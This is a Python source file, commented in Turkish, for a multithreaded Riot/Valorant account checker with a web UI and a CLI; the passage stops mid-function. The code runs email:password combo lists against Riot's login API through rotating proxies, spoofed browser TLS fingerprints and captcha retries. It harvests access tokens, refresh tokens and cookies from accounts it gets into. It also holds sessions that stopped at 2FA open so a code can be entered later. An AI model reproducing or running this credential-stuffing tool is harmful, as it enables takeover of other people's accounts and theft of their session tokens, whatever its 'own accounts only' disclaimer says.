#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VALORANT RSO CHECKER v2  —  web arayuzlu + CLI, thread'li Riot/Valorant hesap dogrulama

v2'de eklenenler:
  [1] HIT sonrasi RSO derinligi:  code -> access_token -> entitlements -> userinfo
      -> region tespiti -> players (GameName#TagLine, accountLevel) -> MMR (tier/RR/Wins)
      -> account-xp (Level).  Hit satirlari artik "eu | Player#TTT | Lv.37 | Gold 2 (58 RR)" gibi.
  [2] 2FA canli tamamlama: 2FA'ya dusen oturumlar hafizada tutulur (TTL'li),
      /api/mfa uzerinden kod gonderilir, basarili olan HIT olarak kaydedilir.
  [3] CLI modu:  --cli combos.txt [proxies.txt]  (Flask'siz, headless)
  [4] Yapilandirilmis rapor: her oturum sonunda out_riot_*/summary.json
      (sayaclar, sure, mod, durum/tag kirilimi) + /api/download?type=json
  [5] Saglamlik: istek pacing (gecikme), periyodik flush (monitor 5sn'de bir dosyaya yazar),
      Host-header dogrulamasi (DNS rebinding korumasi), gecikme jitter'i.

Calistirma:
    python valorant_checker_v2.py                             # web UI  -> http://localhost:5000
    python valorant_checker_v2.py --port 8080                 # ozel port
    python valorant_checker_v2.py --mock                      # Riot'a istek atmadan deterministik simulasyon
    python valorant_checker_v2.py --cli combos.txt [proxies.txt] [--threads 16] [--delay 40] [--no-enrich]

Bagimliliklar (Riot'a gercek istek icin):  pip install requests curl-cffi
Web sunucusu icin Flask, saglam thread pool icin waitress (opsiyonel).

Not: Yalnizca kendi hesaplarinizda veya yetkilendirilmis test ortaminda kullanin.
"""

import base64
import hashlib
import json
import os
import queue
import random
import re
import string
import sys
import threading
import time
import urllib.parse
from collections import deque

# ---------------------------------------------------------------- HTTP libs
try:
    from curl_cffi.requests import Session as _CurlSession
    _CURL = True
except ImportError:
    _CURL = False

try:
    import requests as _req
    _REQ = True
except ImportError:
    _REQ = False

try:
    from flask import Flask, jsonify, request, Response
    _FLASK = True
except ImportError:
    _FLASK = False

try:
    from waitress import serve as _ws_serve
    _WAITRESS = True
except ImportError:
    _WAITRESS = False

# ---------------------------------------------------------------- banner
_BANNER = r"""
    ___  ________ ___   _____ ___ ___  _  _  _____ _____ ___  _  _
   |   \|  _  \ __|   \ / __| __| _ \| || ||_   _|_   _| __|| \| |
   | |) | | | | _|| |) | (__| _||   /| __ |  | |   | | | _| | .` |
   |___/|_| |_|___|___/ \___|___|_|_\|_||_|  |_|   |_| |___||_|\_|
   RSO CHECKER v2  ·  web ui + cli  ·  enrich + mfa  ·  auth.riotgames.com
"""

# ---------------------------------------------------------------- config
_AUTH       = "https://auth.riotgames.com/api/v1/authorization"
_TOKEN      = "https://auth.riotgames.com/token"
_ENTITLE    = "https://entitlements.auth.riotgames.com/api/token/v1"
_USERINFO   = "https://auth.riotgames.com/userinfo"
_GEOPAS     = "https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant"
_REDIRECT   = "https://playvalorant.com/redirect"
_CID        = "play-valorant-web-prod"
_MR         = 3                 # max retry per combo
_TO         = 22                # per-request timeout (auth)
_TO_SHORT   = 12                # enrich / token istekleri icin timeout
_MFA_TTL    = 600               # 2FA oturumunun hafizada kaldiği sure (sn)
_MFA_MAX    = 250               # hafizada tutulacak max 2FA oturumu
_MOCK       = "--mock" in sys.argv
_SENTINEL   = object()          # worker bitis isareti

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
]

# pd (Player Delivery) cagrilari icin gerekli Riot istemci header'lari
_CPLAT = base64.b64encode(json.dumps({
    "platformType": "PC",
    "platformOS": "Windows",
    "platformOSVersion": "10.0.19042.1",
    "platformChipset": "Unknown",
}).encode("utf-8")).decode("ascii")
# Canli enrich (pd.pvp.net) icin dogru client version sart. Her patch'te bayatlar.
# Oncelik sirasi: --cver arg -> RSO_CVER env -> otomatik fetch (valorant-api.com) -> varsayilan.
_CVER = os.environ.get("RSO_CVER", "") or "release-08.05.0-shipping-17-1946085"
_CVER_FETCH_URL = "https://valorant-api.com/v1/version"
_CVER_FETCHED = False


def _fetch_cver(timeout=6):
    """Guncel Riot client version'ini public endpoint'ten ceker.
    Basarisizsa mevcut degeri korur. Sonucu global _CVER'a yazar."""
    global _CVER, _CVER_FETCHED
    if _CVER_FETCHED:
        return _CVER
    _CVER_FETCHED = True
    if "--mock" in sys.argv and "--own" not in sys.argv:
        return _CVER
    try:
        lib = _req if _REQ else None
        if not lib:
            return _CVER
        r = lib.get(_CVER_FETCH_URL, timeout=timeout,
                    headers={"User-Agent": "curl/8.0"})
        r.raise_for_status()
        ver = (r.json().get("data") or {}).get("version") or ""
        if ver.startswith("release-") and "-shipping-" in ver:
            _CVER = ver
    except Exception:
        pass
    return _CVER

# CompetitiveTier id -> ad (v2.0+ tier listesi)
_TIERS = {
    0: "Unrated", 1: "Unknown 1", 2: "Unknown 2",
    3: "Iron 1", 4: "Iron 2", 5: "Iron 3",
    6: "Bronze 1", 7: "Bronze 2", 8: "Bronze 3",
    9: "Silver 1", 10: "Silver 2", 11: "Silver 3",
    12: "Gold 1", 13: "Gold 2", 14: "Gold 3",
    15: "Platinum 1", 16: "Platinum 2", 17: "Platinum 3",
    18: "Diamond 1", 19: "Diamond 2", 20: "Diamond 3",
    21: "Ascendant 1", 22: "Ascendant 2", 23: "Ascendant 3",
    24: "Immortal 1", 25: "Immortal 2", 26: "Immortal 3",
    27: "Radiant",
}

# ---------------------------------------------------------------- helpers
def _px(raw):
    """proxy satirini (proto, host, port, user, pwd) olarak ayristir"""
    raw = raw.strip()
    if not raw:
        return None
    proto = "http"
    for p in ("socks5h://", "socks5://", "socks4a://", "socks4://", "http://", "https://"):
        if raw.lower().startswith(p):
            proto = p.rstrip("://")
            raw = raw[len(p):]
            break
    user = pwd = None
    if "@" in raw:
        creds, raw = raw.rsplit("@", 1)
        user, pwd = (creds.split(":", 1) if ":" in creds else (creds, None))
    host = raw
    port = "8080"
    if raw.startswith("["):
        m = re.match(r"\[([^\]]+)\]:(\d+)", raw)
        if m:
            host, port = m.group(1), m.group(2)
    elif raw.count(":") >= 3 and not user:
        parts = raw.split(":", 3)
        host, port, user, pwd = parts
    elif raw.count(":") == 1:
        host, port = raw.split(":", 1)
    return proto, host, port, user, pwd


def _pd(raw):
    """requests/curl_cffi proxy dict uret"""
    p = _px(raw)
    if not p:
        return None
    proto, host, port, user, pwd = p
    auth = f"{user}:{pwd}@" if (user and pwd) else (f"{user}@" if user else "")
    url = f"{proto}://{auth}{host}:{port}"
    return {"http": url, "https": url}


def _rs(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _tier_name(tid):
    return _TIERS.get(tid, f"Tier {tid}")


# ---------------------------------------------------------------- combo / proxy parse
def parse_combos(lines):
    out = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "@" not in line:
            continue
        sep = ":" if ":" in line else (";" if ";" in line else None)
        if not sep:
            continue
        parts = line.split(sep, 1)
        if len(parts) != 2:
            continue
        em, pw = parts[0].strip(), parts[1].strip()
        if "@" in em and pw and pw != "*none*":
            out.append((em, pw))
    seen, dedup = set(), []
    for t in out:
        if t in seen:
            continue
        seen.add(t)
        dedup.append(t)
    return dedup


def parse_proxies(lines):
    out = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if _px(line):
            out.append(line)
    return out


# ---------------------------------------------------------------- session
def new_session(proxy_url=None):
    """curl_cffi varsa impersonate (TLS parmak izi taklidi), yoksa requests"""
    try:
        if _CURL:
            return _CurlSession(impersonate="chrome131")
    except Exception:
        pass
    return _req.Session()


def _cookie_str(sess):
    """curl_cffi ve requests icin ortak cookie serileştirici.
    curl_cffi'nin Cookies nesnesi .items() yerine .get_dict() kullanir;
    requests ise .items() destekler. Ikisi de yoksa bos doner."""
    if sess is None:
        return ""
    jar = getattr(sess, "cookies", None)
    if jar is None:
        return ""
    items = None
    get_dict = getattr(jar, "get_dict", None)
    if callable(get_dict):
        try:
            items = get_dict().items()
        except Exception:
            items = None
    if not items:
        try:
            items = list(jar.items())
        except Exception:
            items = None
    if not items:
        return ""
    return "; ".join(f"{k}={v}" for k, v in items)


def _auth_headers(ua=None):
    ua = ua or random.choice(_UA_POOL)
    return {
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://authenticate.riotgames.com",
        "Referer": "https://authenticate.riotgames.com/",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }


def _pd_headers(at, et, ua=None):
    """pd.{region}.a.pvp.net cagrilari icin gerekli header seti"""
    return {
        "User-Agent": ua or random.choice(_UA_POOL),
        "Accept": "application/json",
        "Authorization": f"Bearer {at}",
        "X-Riot-Entitlements-JWT": et,
        "X-Riot-ClientPlatform": _CPLAT,
        "X-Riot-ClientVersion": _CVER,
    }


# ---------------------------------------------------------------- riot check
def riot_check(email, password, proxy_url=None, timeout=_TO):
    """Riot RSO iki adimli login:
       1) POST  /api/v1/authorization  -> oturum cookie'leri (asid, tdid, ...)
       2) PUT   /api/v1/authorization  -> kimlik bilgileri, sonuc JSON'da
    Dondurur: (status, tag, cookie_str, uri, session)
       HIT  -> session canli, uri icinde authorization_code var (enrich icin)
       2FA  -> session canli, /api/mfa ile kodla tamamlanabilir"""
    if not (_CURL or _REQ):
        return "FAIL", "no_http_lib", "", "", None
    proxies = _pd(proxy_url)
    hdrs = _auth_headers()
    sess = new_session(proxy_url)
    try:
        r1 = sess.post(_AUTH, json={
            "clientId": _CID,
            "trustLevels": ["always_trusted"],
            "language": "en-US",
            "remember": True,
            "riot_identity": {"identity_type": "RSO_DEFAULT"},
        }, headers=hdrs, proxies=proxies, timeout=timeout)
        r1.raise_for_status()

        r2 = sess.put(_AUTH, json={
            "type": "auth",
            "username": email,
            "password": password,
            "remember": True,
            "language": "en-US",
            "riot_identity": {"identity_type": "RSO_DEFAULT"},
        }, headers=hdrs, proxies=proxies, timeout=timeout)
        try:
            data = r2.json()
        except Exception:
            # HTML / bot sayfasi dondu -> captcha veya login_queue sayilir
            return "RETRY", "non_json_response", "", "", sess
    except Exception as exc:
        err = str(exc)[:80].lower()
        if any(k in err for k in ("timeout", "timed out", "read error", "eof")):
            return "RETRY", "timeout", "", "", sess
        if any(k in err for k in ("proxy", "connect", "refused", "tunnel", "socks", "ssl")):
            return "RETRY", "proxy_err", "", "", sess
        return "RETRY", f"exc:{err[:40]}", "", "", sess

    t = data.get("type", "")
    err = str(data.get("error") or "")

    if t == "response":
        uri = (((data.get("response") or {}).get("parameters") or {}).get("uri")) or ""
        ck = _cookie_str(sess)
        return "HIT", "authenticated", ck, uri, sess

    if t == "multifactor" or "multifactor" in err:
        ck = _cookie_str(sess)
        return "2FA", "multifactor_required", ck, "", sess

    if err in ("auth_failure", "invalid_credentials", "invalid_password"):
        return "FAIL", "auth_failure", "", "", sess

    if err in ("captcha_required", "bot_verification_required", "rate_limited",
               "too_many_requests", "device_verification_required", "login_queue",
               "extra_step_required"):
        return "RETRY", err, "", "", sess

    if t == "auth":
        return "FAIL", f"auth:{err}" if err else "no_match", "", "", sess

    return "FAIL", f"unknown:{t or err}", "", "", sess


# ---------------------------------------------------------------- token / enrich
def _extract_code(uri):
    """authorization uri'sinden code parametresini cikar (query veya fragment)"""
    if not uri:
        return ""
    u = urllib.parse.urlparse(uri)
    q = urllib.parse.parse_qs(u.query)
    if q.get("code"):
        return q["code"][0]
    frag = urllib.parse.parse_qs(u.fragment)
    if frag.get("code"):
        return frag["code"][0]
    m = re.search(r"code=([^&#]+)", uri)
    return urllib.parse.unquote(m.group(1)) if m else ""


def token_exchange(sess, code, proxy_url=None, timeout=_TO_SHORT):
    """authorization_code -> access_token / id_token / refresh_token"""
    payload = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": _REDIRECT,
        "client_id": _CID,
    }
    h = {
        "User-Agent": random.choice(_UA_POOL),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    r = sess.post(_TOKEN, data=payload, headers=h,
                  proxies=_pd(proxy_url) if proxy_url else None, timeout=timeout)
    r.raise_for_status()
    return r.json()


def enrich(sess, uri, proxy_url=None):
    """HIT sonrasi hesabi zenginlestir:
       token -> entitlements -> userinfo(puuid) -> region -> players/mmr/xp
    Her adim ayri try/except; bir adim patlarsa digerleri donmez."""
    info = {}
    code = _extract_code(uri)
    if not code:
        return info
    proxies = _pd(proxy_url) if proxy_url else None
    ua = random.choice(_UA_POOL)

    # 1) access_token
    try:
        tok = token_exchange(sess, code, proxy_url)
        at = tok.get("access_token") or ""
        info["access_token"] = at
        info["expires_in"] = tok.get("expires_in")
        info["refresh_token"] = tok.get("refresh_token", "")
        if not at:
            return info
    except Exception:
        return info

    # 2) entitlements_token
    et = ""
    try:
        r = sess.post(_ENTITLE, json={}, headers={
            "User-Agent": ua, "Accept": "application/json",
            "Authorization": f"Bearer {at}",
        }, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        et = (r.json().get("entitlements_token")) or ""
        info["entitlements"] = et
    except Exception:
        pass

    # 3) userinfo -> puuid
    puuid = ""
    try:
        r = sess.get(_USERINFO, headers={
            "User-Agent": ua, "Accept": "application/json",
            "Authorization": f"Bearer {at}",
        }, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        ui = r.json()
        puuid = ui.get("sub") or ""
        info["puuid"] = puuid
        info["country"] = ui.get("country") or ""
        info["email_verified"] = bool(ui.get("email_verified"))
    except Exception:
        return info
    if not puuid:
        return info

    # 4) region tespiti (affinity)
    region = ""
    try:
        r = sess.get(_GEOPAS, headers={
            "User-Agent": ua, "Accept": "application/json",
            "Authorization": f"Bearer {at}",
            "X-Riot-Entitlements-JWT": et,
        }, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        region = (((r.json()).get("affinities") or {}).get("live")) or ""
        info["region"] = region
    except Exception:
        pass
    region = region or "na"
    info["region"] = region

    if not et:
        return info

    pdh = _pd_headers(at, et, ua)

    # 5) players -> GameName#TagLine + accountLevel
    try:
        r = sess.get(
            f"https://pd.{region}.a.pvp.net/account/v1/players?puuid={puuid}",
            headers=pdh, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        pl = r.json()
        info["game_name"] = pl.get("GameName") or ""
        info["tag_line"] = pl.get("TagLine") or ""
        info["account_level"] = pl.get("accountLevel") or pl.get("AccountLevel") or 0
    except Exception:
        pass

    # 6) mmr -> rekabetci tier / RR / galibiyet
    try:
        r = sess.get(
            f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}",
            headers=pdh, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        mmr = r.json()
        qs = ((mmr.get("QueueSkills") or {}).get("competitive") or {})
        seasons = qs.get("SeasonalInfoBySeasonID") or {}
        if seasons:
            best = max(seasons.values(), key=lambda s: ((s.get("CompetitiveTier") or 0),
                                                        (s.get("RankedRating") or 0)))
            info["tier_id"] = best.get("CompetitiveTier") or 0
            info["tier"] = _tier_name(info["tier_id"])
            info["rr"] = best.get("RankedRating") or 0
            info["wins"] = best.get("Wins") or 0
            info["games"] = best.get("NumberOfGames") or 0
    except Exception:
        pass

    # 7) account-xp -> Level
    try:
        r = sess.get(
            f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}",
            headers=pdh, proxies=proxies, timeout=_TO_SHORT)
        r.raise_for_status()
        xp = r.json()
        info["level"] = xp.get("Level") or 0
        info["xp"] = xp.get("XP") or 0
    except Exception:
        pass

    return info


def fmt_enrich(info, tag=""):
    """enrich dict'ini tek satirlik ozet etikete cevir"""
    parts = []
    if info.get("region"):
        parts.append(info["region"])
    gn, tl = info.get("game_name") or "", info.get("tag_line") or ""
    if gn and tl:
        parts.append(f"{gn}#{tl}")
    elif gn:
        parts.append(gn)
    lv = info.get("level") or info.get("account_level") or 0
    if lv:
        parts.append(f"Lv.{lv}")
    if info.get("tier"):
        s = info["tier"]
        if info.get("rr") is not None:
            s += f" ({info['rr']} RR)"
        parts.append(s)
    if info.get("wins") is not None:
        parts.append(f"{info['wins']}W")
    if parts:
        return (tag + " | " if tag else "") + " · ".join(parts)
    return tag


# ---------------------------------------------------------------- mfa tamamlama
def complete_mfa(sess, code, proxy_url=None, timeout=_TO):
    """2FA oturumuna multifactor kodunu gonderir.
    Basarili: (True, uri, cookies)   /  Basarisiz: (False, error, "")"""
    hdrs = _auth_headers()
    try:
        r = sess.put(_AUTH, json={
            "type": "multifactor",
            "code": code.strip(),
            "remember": True,
            "language": "en-US",
        }, headers=hdrs, proxies=_pd(proxy_url) if proxy_url else None, timeout=timeout)
        data = r.json()
    except Exception as exc:
        return False, f"exc:{str(exc)[:60]}", ""
    t = data.get("type", "")
    err = str(data.get("error") or "")
    if t == "response":
        uri = (((data.get("response") or {}).get("parameters") or {}).get("uri")) or ""
        ck = _cookie_str(sess)
        return True, uri, ck
    if t == "multifactor" or "multifactor" in err:
        return False, "multifactor_required", ""
    if "invalid" in err.lower() or "wrong" in err.lower() or err in ("auth_failure",):
        return False, "invalid_code", ""
    return False, f"error:{err or t or 'unknown'}", ""


# ---------------------------------------------------------------- mock check
def mock_check(email, password):
    """Riot'a istek atmadan deterministik sonuc uretir (UI/CLI akisini test icin)."""
    h = hashlib.md5(f"{email}:{password}".encode("utf-8", "replace")).digest()
    b = h[0]
    if b < 18:
        # mock enrich bilgisiyle birlikte HIT
        info = {
            "region": random.choice(["eu", "na", "tr", "ap"]),
            "game_name": "MockPlayer",
            "tag_line": _rs(4).upper(),
            "level": random.randint(20, 400),
            "tier": random.choice(list(_TIERS.values())[3:]),
            "rr": random.randint(0, 100),
            "wins": random.randint(10, 900),
            "access_token": "mock_at_" + _rs(24),
            "entitlements": "mock_et_" + _rs(24),
            "puuid": "mock_" + _rs(32),
            "refresh_token": "mock_rt_" + _rs(24),
        }
        tok = ("https://auth.riotgames.com/authorize?code=" + _rs(24)
               + "&mock=1&iss=" + _rs(8))
        ck = "; ".join(f"mock_{k}={_rs(6)}" for k in ("ssid", "tdid", "asid"))
        return "HIT", fmt_enrich(info, "mock_hit"), ck, tok, info
    if b < 32:
        return "2FA", "multifactor_required", "; ".join(f"mock_{k}={_rs(6)}" for k in ("asid", "tdid")), "", None
    if b < 40:
        return "RETRY", "mock_retry", "", "", None
    return "FAIL", "mock_fail", "", "", None


# ---------------------------------------------------------------- job manager
class ProxyPool:
    def __init__(self, proxies):
        self._p = list(proxies)
        self._i = 0
        self._l = threading.Lock()

    def next(self):
        with self._l:
            if not self._p:
                return None
            v = self._p[self._i % len(self._p)]
            self._i += 1
            return v

    def __len__(self):
        return len(self._p)


class Job:
    def __init__(self):
        self._lock = threading.RLock()          # reentrant: nested lock cagrilari var
        self.reset()

    # ---------------- durum
    def reset(self):
        self.running = False
        self.mock = _MOCK
        self.enrich = True
        self.delay_ms = 30
        self.total = self.done = self.hits = self.fails = self.tfa = self.retry = 0
        self.t0 = self.t1 = 0.0
        self._win = []
        self.recent = deque(maxlen=300)
        self.bufs = {"hits": [], "fails": [], "tfa": [], "all": [], "tokens": []}
        self.q = queue.Queue()
        self.stop = threading.Event()
        self.threads = []
        self.pool = None
        self.out_dir = ""
        self._mfa = {}                          # email -> {"sess":..., "ts":...}
        self._mfa_lock = threading.Lock()
        self._meta = {}                         # tag kirilimi vs.
        self._start_iso = ""
        self._finish_iso = ""

    # ---------------- istatistik
    def _tick(self):
        now = time.time()
        self._win.append(now)
        self._win = [t for t in self._win if t >= now - 60]

    @property
    def cpm(self):
        with self._lock:
            return len(self._win)

    @property
    def elapsed(self):
        if not self.t0:
            return "00:00:00"
        s = int((self.t1 or time.time()) - self.t0)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"

    def _append(self, kind, line):
        self.bufs.setdefault(kind, []).append(line)
        if len(self.bufs[kind]) > 5000:
            self.bufs[kind] = self.bufs[kind][-5000:]

    # ---------------- kayit
    def _record(self, st, em, pw, tag, ck, tok, info=None):
        now = time.strftime("%H:%M:%S")
        with self._lock:
            if st == "HIT":
                self.hits += 1
            elif st == "2FA":
                self.tfa += 1
            else:
                self.fails += 1
            self.done += 1
            self._tick()
            self._meta[tag] = self._meta.get(tag, 0) + 1
            self.recent.appendleft({"t": now, "s": st, "a": em, "d": tag})

        base = f"{em}:{pw}"
        if st == "HIT":
            self._append("hits", f"{base} | {tag}")
            self._append("all", f"{base} | {tag}")
            det = f"{base} | {tag}"
            if ck:
                det += f" | cookies: {ck}"
            if tok:
                det += f" | uri: {tok}"
            if info:
                det += f" | meta: {json.dumps(info, ensure_ascii=False)}"
            self._append("tokens", det)
        elif st == "2FA":
            self._append("tfa", f"{base} | {tag}")
            self._append("all", f"{base} | {tag}")
            if ck:
                self._append("tokens", f"{base} | {tag} | cookies: {ck}")
        else:
            self._append("fails", f"{base} | {tag}")
            self._append("all", f"{base} | {tag}")

    # ---------------- mfa havuzu
    def _store_mfa(self, email, sess):
        with self._mfa_lock:
            now = time.time()
            self._mfa[email] = {"sess": sess, "ts": now}
            # TTL + cap temizligi
            stale = [k for k, v in self._mfa.items() if now - v["ts"] > _MFA_TTL]
            for k in stale:
                del self._mfa[k]
            while len(self._mfa) > _MFA_MAX:
                oldest = min(self._mfa, key=lambda k: self._mfa[k]["ts"])
                del self._mfa[oldest]

    def pending_mfa(self):
        with self._mfa_lock:
            return sorted(self._mfa.keys())

    def take_mfa(self, email):
        """email'in 2FA oturumunu havuzdan ayirir (kullanim icin)"""
        with self._mfa_lock:
            e = self._mfa.pop(email, None)
        return e

    # ---------------- yasam dongusu
    def start(self, combos, proxies, threads, mock, delay_ms=30, enrich=True,
              proxy_url_first=None):
        with self._lock:
            self.reset()
            self.mock = mock or _MOCK
            self.enrich = enrich
            self.delay_ms = max(0, min(2000, int(delay_ms)))
            self.total = len(combos)
            self.t0 = time.time()
            self._start_iso = time.strftime("%Y-%m-%dT%H:%M:%S%z")

            ts = time.strftime("%Y%m%d_%H%M%S")
            self.out_dir = os.path.join(
                os.path.dirname(os.path.abspath(__file__)), f"out_riot_{ts}")
            os.makedirs(self.out_dir, exist_ok=True)

            self.pool = ProxyPool(proxies) if proxies else None
            for em, pw in combos:
                self.q.put((em, pw))
            n = min(threads, max(1, len(combos)))
            for _ in range(n):
                self.q.put(_SENTINEL)
            self.running = True
            self.stop.clear()
            self.threads = [threading.Thread(target=self._worker, daemon=True)
                            for _ in range(n)]
            for t in self.threads:
                t.start()
            threading.Thread(target=self._monitor, daemon=True).start()

    def stop(self):
        self.stop.set()
        for t in self.threads:
            t.join(timeout=2)
        with self._lock:
            self.running = False
            self._dump_files()

    # ---------------- calisanlar
    def _worker(self):
        while not self.stop.is_set():
            try:
                item = self.q.get(timeout=0.4)
            except queue.Empty:
                continue
            if item is _SENTINEL:
                self.q.task_done()
                break
            em, pw = item
            proxy = self.pool.next() if self.pool else None

            st = tag = ck = tok = ""
            info = None
            sess = None
            for attempt in range(_MR):
                if self.stop.is_set():
                    break
                if attempt and self.pool:
                    proxy = self.pool.next()
                    time.sleep(0.35)
                try:
                    if self.mock:
                        st, tag, ck, tok, info = mock_check(em, pw)
                        sess = None
                    else:
                        st, tag, ck, tok, sess = riot_check(em, pw, proxy)
                        info = None
                except Exception as exc:
                    st, tag = "RETRY", str(exc)[:60]
                if st != "RETRY":
                    break
                with self._lock:
                    self.retry += 1

            # --- sonuc isleme
            if st == "HIT":
                if not self.mock and self.enrich and sess is not None:
                    try:
                        info = enrich(sess, tok, proxy)
                        tag = fmt_enrich(info, tag)
                    except Exception:
                        info = None
                self._record("HIT", em, pw, tag, ck, tok, info)
            elif st == "2FA":
                if sess is not None or self.mock:
                    self._store_mfa(em, sess)
                self._record("2FA", em, pw, "multifactor_required · kod beklemede", ck, "", None)
            else:
                if st == "FAIL":
                    self._record("FAIL", em, pw, tag, "", "", None)
                else:
                    self._record("FAIL", em, pw, f"retry_exhausted:{tag}", "", "", None)
            self.q.task_done()

            # --- pacing: her combo sonrasi jitter'li gecikme
            if self.delay_ms and not self.mock:
                time.sleep((self.delay_ms / 1000.0) * random.uniform(0.6, 1.4))

    def _monitor(self):
        while self.running:
            time.sleep(0.5)
            alive = any(t.is_alive() for t in self.threads)
            if not alive and self.q.empty():
                with self._lock:
                    self.running = False
                    self.t1 = time.time()
                    self._dump_files()
                break
            # periyodik flush: is devam ederken de dosyalar guncel kalsin
            if int(time.time()) % 5 == 0:
                self._dump_files()

    # ---------------- cikti
    def _dump_files(self):
        """sonuclari out_riot_*/ dosyalarina yazar + summary.json uretir"""
        if not self.out_dir:
            return
        try:
            for kind in ("hits", "fails", "tfa", "tokens"):
                p = os.path.join(self.out_dir, f"{kind}.txt")
                lines = self.bufs.get(kind, [])
                with open(p, "w", encoding="utf-8") as f:
                    f.write("\n".join(lines) + ("\n" if lines else ""))
            p = os.path.join(self.out_dir, "all.txt")
            lines = self.bufs.get("all", [])
            with open(p, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + ("\n" if lines else ""))
            self._write_summary()
        except Exception:
            pass

    def _write_summary(self):
        """yapilandirilmis audit raporu: summary.json"""
        try:
            summary = {
                "tool": "valorant_rso_checker_v2",
                "mode": "mock" if self.mock else "live",
                "started_at": self._start_iso,
                "finished_at": self._finish_iso or time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                "elapsed_s": int((self.t1 or time.time()) - self.t0) if self.t0 else 0,
                "total": self.total,
                "done": self.done,
                "hits": self.hits,
                "fails": self.fails,
                "tfa": self.tfa,
                "retries": self.retry,
                "threads": len(self.threads),
                "delay_ms": self.delay_ms,
                "proxy_count": len(self.pool) if self.pool else 0,
                "enrich": self.enrich,
                "status_breakdown": {"HIT": self.hits, "FAIL": self.fails,
                                     "2FA": self.tfa, "RETRY": self.retry},
                "tag_breakdown": dict(sorted(self._meta.items(),
                                             key=lambda kv: kv[1], reverse=True)),
                "out_dir": self.out_dir,
            }
            with open(os.path.join(self.out_dir, "summary.json"), "w",
                      encoding="utf-8") as f:
                json.dump(summary, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    # ---------------- api snapshot
    def snapshot(self):
        with self._lock:
            return {
                "running": self.running,
                "mock": self.mock,
                "enrich": self.enrich,
                "delay_ms": self.delay_ms,
                "total": self.total, "done": self.done,
                "hits": self.hits, "fails": self.fails,
                "tfa": self.tfa, "retry": self.retry,
                "cpm": self.cpm, "elapsed": self.elapsed,
                "threads": len(self.threads),
                "out_dir": os.path.basename(self.out_dir) if self.out_dir else "",
                "mfa": self.pending_mfa(),
                "recent": list(self.recent)[:150],
            }

    # ---------------- cli raporu
    def cli_summary_text(self):
        p = self.threads and len(self.threads) or 0
        return (
            f"\n--- SONUC ---\n"
            f"  sure     : {self.elapsed}\n"
            f"  toplam   : {self.total}   islenen: {self.done}\n"
            f"  HIT      : {self.hits}\n"
            f"  2FA      : {self.tfa}\n"
            f"  FAIL     : {self.fails}\n"
            f"  retry    : {self.retry}\n"
            f"  cikti    : {self.out_dir}\n")


JOB = Job()

# ---------------------------------------------------------------- web app
app = Flask(__name__)


def _host_ok():
    """DNS rebinding korumasi: sadece localhost/127.0.0.1 kabul et"""
    host = (request.host or "").split(":")[0].lower()
    return host in ("localhost", "127.0.0.1", "::1")


@app.before_request
def _guard():
    if not _host_ok():
        return jsonify(ok=False, error="bad_host", msg="Yalnizca localhost"), 403


@app.get("/")
def index():
    return Response(_HTML, mimetype="text/html; charset=utf-8")


@app.get("/api/state")
def api_state():
    return jsonify(JOB.snapshot())


@app.post("/api/start")
def api_start():
    if JOB.running:
        return jsonify(ok=False, error="job_running", msg="Zaten calisan bir is var"), 409
    try:
        d = request.get_json(force=True) or {}
    except Exception:
        return jsonify(ok=False, error="bad_json", msg="JSON gonderilemedi"), 400

    combos = parse_combos(d.get("combos") or [])
    proxies = parse_proxies(d.get("proxies") or [])
    try:
        threads = max(1, min(64, int(d.get("threads") or 10)))
    except Exception:
        threads = 10
    try:
        _dl = d.get("delay")
        delay = max(0, min(2000, int(_dl if _dl is not None else 30)))
    except Exception:
        delay = 30
    mock = bool(d.get("mock"))
    enrich = bool(d.get("enrich", True))

    if not combos:
        return jsonify(ok=False, error="empty_combos",
                       msg="Gecerli combo bulunamadi (email:password)"), 400

    JOB.start(combos, proxies, threads, mock, delay, enrich)
    return jsonify(ok=True, total=len(combos), proxies=len(proxies),
                   threads=threads, delay=delay, enrich=enrich)


@app.post("/api/stop")
def api_stop():
    JOB.stop()
    return jsonify(ok=True)


@app.get("/api/mfa")
def api_mfa_list():
    return jsonify(ok=True, mfa=JOB.pending_mfa())


@app.post("/api/mfa")
def api_mfa_submit():
    """2FA kodunu tamamlar: {email, code}  -> HIT olarak kaydeder"""
    try:
        d = request.get_json(force=True) or {}
    except Exception:
        return jsonify(ok=False, error="bad_json", msg="JSON gonderilemedi"), 400
    email = (d.get("email") or "").strip()
    code = (d.get("code") or "").strip()
    if not email or not code:
        return jsonify(ok=False, error="missing_fields",
                       msg="email ve code gerekli"), 400

    entry = JOB.take_mfa(email)
    if not entry:
        return jsonify(ok=False, error="no_session",
